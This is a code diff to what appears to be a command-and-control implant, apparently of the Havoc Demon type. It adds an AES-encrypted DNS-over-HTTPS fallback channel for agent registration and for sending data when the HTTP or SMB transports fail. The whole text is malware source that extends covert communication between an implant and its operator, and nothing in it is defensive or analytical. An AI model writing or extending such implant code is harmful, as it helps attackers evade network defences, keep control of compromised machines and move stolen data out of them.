@@ -7,6 +7,7 @@
 #include <core/MiniStd.h>
 #include <core/TransportHttp.h>
 #include <core/TransportSmb.h>
+#include <core/TransportDoH.h>
 
 #include <crypt/AesCrypt.h>
 
@@ -46,6 +47,29 @@ BOOL TransportInit( )
     }
 #endif
 
+#ifdef TRANSPORT_DOH
+    /* DoH acts as a fallback — only attempt if no other transport succeeded. */
+    if ( !Success && Instance->Config.Transport.DoHDomain )
+    {
+        if ( PackageTransmitNow( Instance->MetaData, &Data, &Size ) )
+        {
+            AESCTX AesCtx = { 0 };
+
+            AesInit( &AesCtx, Instance->Config.AES.Key, Instance->Config.AES.IV );
+            AesXCryptBuffer( &AesCtx, Data, Size );
+
+            if ( Data )
+            {
+                if ( ( UINT32 ) Instance->Session.AgentID == ( UINT32 ) DEREF( Data ) )
+                {
+                    Instance->Session.Connected = TRUE;
+                    Success = TRUE;
+                }
+            }
+        }
+    }
+#endif
+
     return Success;
 }
 
@@ -77,6 +101,26 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
     if ( SmbSend( &Send ) )
     {
         return TRUE;
+    }
+
+#endif
+
+#ifdef TRANSPORT_DOH
+
+    /* DoH fallback — only attempt if primary transport failed and
+     * a DoH domain is configured in the profile. */
+    if ( Instance->Config.Transport.DoHDomain )
+    {
+        if ( DoHSend( &Send, &Resp ) )
+        {
+            if ( RecvData )
+                *RecvData = Resp.Buffer;
+
+            if ( RecvSize )
+                *RecvSize = Resp.Length;
+
+            return TRUE;
+        }
     }
 
 #endif
